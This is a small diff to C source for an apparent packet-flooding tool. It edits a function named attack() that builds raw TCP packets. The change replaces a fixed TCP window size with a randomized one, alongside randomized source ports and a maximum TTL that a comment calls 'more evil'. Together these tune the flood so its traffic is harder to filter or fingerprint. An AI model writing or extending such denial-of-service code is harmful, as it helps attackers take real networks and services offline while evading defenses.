@@ -333,9 +333,7 @@ void attack(unsigned int dest, unsigned short dstport, unsigned int mode, unsign
         xf_tcphdr->th_sport = htons(((rand_cmwc() % RAND_PORT_MAX) + RAND_PORT_MIN));
 
     // Randomize TCP window.
-    //xf_tcphdr->th_win = htons(((rand_cmwc() % TCP_WINDOW_SIZE_MAX) + TCP_WINDOW_SIZE_MIN));
-    // No, set it to 8192 instead.
-    xf_tcphdr->th_win = htons(8192);
+    xf_tcphdr->th_win = htons(((rand_cmwc() % TCP_WINDOW_SIZE_MAX) + TCP_WINDOW_SIZE_MIN));
 
     // larger ttls are also more evil 
     xf_iphdr->ip_ttl = TCP_TTL_MAX;
